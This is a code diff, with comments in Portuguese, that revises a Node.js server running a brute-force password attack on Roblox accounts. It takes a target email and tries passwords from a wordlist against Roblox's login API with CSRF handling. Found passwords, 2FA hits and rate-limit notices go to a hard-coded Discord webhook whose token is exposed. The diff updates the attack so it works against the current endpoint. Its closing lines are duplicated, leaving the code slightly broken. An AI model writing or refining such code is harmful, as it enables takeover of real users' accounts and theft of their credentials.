@@ -6,7 +6,7 @@ const path = require('path');
 const app = express();
 const port = process.env.PORT || 3000;
 
-// URL DO WEBHOOK DO DISCORD
+// URL do Webhook do Discord
 const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoWanOsTF6O399cs-x-psk-RfPS84OEFe60HL-x7JrVutP4QGYow-2c4NDYKQ89DB";
 
 app.use(express.json());
@@ -28,86 +28,70 @@ async function sendDiscordMessage(content) {
 
 // Função para tentar Login no Roblox (Método Corrigido)
 async function tryRobloxLogin(email, password) {
-    const baseUrl = "https://www.roblox.com";
-
-    // Criar um cliente Axios que gerencia cookies automaticamente
     const client = axios.create({
-        baseURL: baseUrl,
-        timeout: 10000,
+        baseURL: 'https://auth.roblox.com',
+        timeout: 15000,
         withCredentials: true,
         headers: {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36',
             'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Accept-Language': 'en-US,en;q=0.9',
-            'Referer': 'https://www.roblox.com/login',
+            'Content-Type': 'application/json'
         }
     });
 
     try {
-        // 1. Fazer um GET na página de login para pegar o Cookie e o Token CSRF (se houver)
-        // Isso é crucial para o Roblox não achar que é um "Guest"
-        const loginPage = await client.get('/login');
-        
-        // Extrair o token CSRF do HTML da página de login (opcional, mas ajuda)
-        const html = loginPage.data;
-        const csrfMatch = html.match(/<meta name="csrf-token" content="([^"]+)"/);
-        const csrfToken = csrfMatch ? csrfMatch[1] : '';
+        // 1. Obter CSRF token
+        const getReq = await client.get('/v2/login');
+        const csrfToken = getReq.headers['x-csrf-token'];
 
-        // 2. Preparar os dados de login
-        // O Roblox usa application/x-www-form-urlencoded para o login clássico
-        const formData = new URLSearchParams();
-        formData.append('username', email);
-        formData.append('password', password);
+        // 2. Enviar JSON de login
+        const loginPayload = {
+            username: email,
+            password: password,
+            isTfa: false
+        };
 
-        // 3. Fazer o POST no endpoint de login
-        // Usamos o endpoint /users/login que é o padrão para contas verificadas
-        const loginResponse = await client.post('/users/login', formData, {
+        const loginRes = await client.post('/v2/login', loginPayload, {
             headers: {
-                'Content-Type': 'application/x-www-form-urlencoded',
-                'X-Requested-With': 'XMLHttpRequest',
-                'X-CSRF-TOKEN': csrfToken // Enviar o token se tiver
+                'X-CSRF-TOKEN': csrfToken,
+                'Referer': 'https://www.roblox.com/login'
             }
         });
 
-        // 4. Verificar a resposta
-        // Sucesso: Retorna um objeto com 'id', 'username', etc.
-        if (loginResponse.data && loginResponse.data.id) {
-            return {
-                success: true,
-                username: loginResponse.data.username,
-                userId: loginResponse.data.id
-            };
+        if (loginRes.data && loginRes.data.user) {
+            return { success: true, username: loginRes.data.user.name, userId: loginRes.data.user.id };
+        } else if (loginRes.data.errors) {
+            const err = loginRes.data.errors[0];
+            if (err.code === 2) {
+                return { success: false, error: "Credenciais inválidas" };
+            } else if (err.code === 0 && err.message.includes("TwoStepVerification")) {
+                return { success: false, error: "2FA necessário" };
+            } else {
+                return { success: false, error: err.message || "Erro desconhecido" };
+            }
         } else {
-            // Erro comum: "Password is incorrect" ou "User not found"
-            const errorMsg = loginResponse.data.error || loginResponse.data.message || "Erro Desconhecido";
-            return {
-                success: false,
-                error: errorMsg
-            };
+            return { success: false, error: "Resposta inesperada do Roblox" };
         }
 
     } catch (error) {
-        // Se der erro de rede ou status
         const status = error.response ? error.response.status : 'Sem Status';
         const data = error.response ? error.response.data : error.message;
-        
         return {
             success: false,
-            error: `Erro HTTP ${status}: ${JSON.stringify(data).substring(0, 100)}`
+            error: `HTTP ${status}: ${JSON.stringify(data).substring(0, 150)}`
         };
     }
 }
 
 // FUNÇÃO PRINCIPAL: Ataque de Força Bruta
 async function startBruteForce(email) {
-    // 1. Ler o ficheiro de senhas
     let passwords = [];
     try {
         const rawData = fs.readFileSync(path.join(__dirname, 'senhas.txt'), 'utf-8');
         passwords = rawData.split('\n').map(p => p.trim()).filter(p => p.length > 0);
     } catch (e) {
         console.error("Erro ao ler senhas.txt:", e.message);
-        await sendDiscordMessage(`**❌ ERRO NO ARQUIVO:** senhas.txt não encontrado ou vazio!`);
+        await sendDiscordMessage(`**❌ ERRO:** senhas.txt não encontrado ou vazio!`);
         return;
     }
 
@@ -121,7 +105,6 @@ async function startBruteForce(email) {
 
     let found = false;
 
-    // 2. Testar cada senha
     for (const password of passwords) {
         if (found) break;
 
@@ -133,13 +116,24 @@ async function startBruteForce(email) {
             await sendDiscordMessage(msg);
             console.log("ENCONTRADA:", password);
         } else {
-            // Enviar erro resumido
-            const errorMsg = `❌ **Tentativa Falhada**\n**Senha:** ${password}\n**Erro:** ${result.error}`;
-            await sendDiscordMessage(errorMsg);
+            // Apenas envia erros relevantes (credenciais inválidas, 2FA, etc.)  
+            // Para evitar flood, envia apenas a cada 10 tentativas falhas
+            if (result.error.includes("2FA")) {
+                await sendDiscordMessage(`**⚠️ 2FA DETECTADO**\n**Email:** ${email}\n**Senha:** ${password}\n**Erro:** ${result.error}`);
+            } else if (result.error.includes("Credenciais inválidas")) {
+                // Não enviar todas as falhas por flood, podemos logar apenas no console
+                console.log(`Falha para ${password}: Credenciais inválidas`);
+            } else {
+                console.log(`Falha para ${password}: ${result.error}`);
+                // Enviar apenas se for erro não-crítico (ex: rate limit)
+                if (result.error.includes("HTTP 429") || result.error.includes("Too Many Requests")) {
+                    await sendDiscordMessage(`**⏳ RATE LIMIT**\n**Senha:** ${password}\n**Erro:** ${result.error}`);
+                }
+            }
         }
 
-        // Pausa para não bloquear o Email no Roblox (Rate Limit)
-        await new Promise(r => setTimeout(r, 2000)); 
+        // Pausa de 2 segundos entre tentativas
+        await new Promise(r => setTimeout(r, 2000));
     }
 
     if (!found) {
@@ -148,21 +142,22 @@ async function startBruteForce(email) {
 }
 
 // ENDPOINT: Receber o Email do Site e Iniciar o Ataque
-app.post('/start-brute-force', async (req, res) {
+app.post('/start-brute-force', async (req, res) => {
     const { email } = req.body;
 
     if (!email || !email.includes('@')) {
         return res.json({ success: false, error: "Email inválido" });
     }
 
-    // Iniciar o ataque em "background"
     startBruteForce(email);
 
-    // Retornar resposta imediata ao site
     return res.json({ success: true, message: "Ataque iniciado! Aguarde as notificações no Discord." });
 });
 
 // INICIAR SERVIDOR
 app.listen(port, () => {
+    console.log(`✅ Servidor rodando na porta ${port}`);
+});
+
     console.log(`✅ Servidor rodando na porta ${port}`);
 });
